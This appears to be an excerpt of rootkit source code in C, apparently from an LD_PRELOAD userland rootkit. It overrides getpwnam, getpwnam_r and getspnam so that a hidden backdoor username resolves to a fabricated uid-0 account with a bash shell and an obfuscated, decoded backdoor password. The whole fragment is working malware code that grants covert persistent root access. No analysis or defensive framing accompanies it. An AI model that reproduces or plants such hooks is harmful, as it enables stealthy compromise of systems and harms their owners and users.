struct passwd *getpwnam(const char *name){
	hook(CGETPWNAM);
	if(!xstrncmp(name, BD_UNAME)){
		struct passwd *bpw = call(CGETPWNAM, "root");
		bpw->pw_name = strdup(name);
		bpw->pw_uid = 0;
		bpw->pw_gid = MAGIC_GID;
		bpw->pw_dir = "/var/tmp/";
		bpw->pw_shell = "/bin/bash";
		return bpw;
	}
	return call(CGETPWNAM, name);
}

int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result){
	hook(CGETPWNAM_R);
	if(!xstrncmp(name, BD_UNAME)){
		call(CGETPWNAM_R, "root", pwd, buf, buflen, result);
		pwd->pw_name = strdup(name);
		pwd->pw_uid = 0;
		pwd->pw_gid = MAGIC_GID;
		pwd->pw_dir = "/var/tmp/";
		pwd->pw_shell = "/bin/bash";
		return 0;
	}
	return (long)call(CGETPWNAM_R, name, pwd, buf, buflen, result);
}

struct spwd *getspnam(const char *name){
	if(!xstrncmp(name, BD_UNAME)){
		struct spwd *bspwd = malloc(sizeof(struct spwd));
		bspwd->sp_namp = strdup(name);
		xor(bd_pwd, BD_PWD);
		bspwd->sp_pwdp = bd_pwd;
		clean(bd_pwd);
		bspwd->sp_lstchg = time(NULL) / (60 * 60 * 24);
		bspwd->sp_expire = time(NULL) / (60 * 60 * 24) + 90;
		bspwd->sp_inact = 9001;
		bspwd->sp_warn = 0;
		bspwd->sp_min = 0;
		bspwd->sp_max = 99999;
		return bspwd;
	}
	hook(CGETSPNAM);
	return call(CGETSPNAM, name);
}
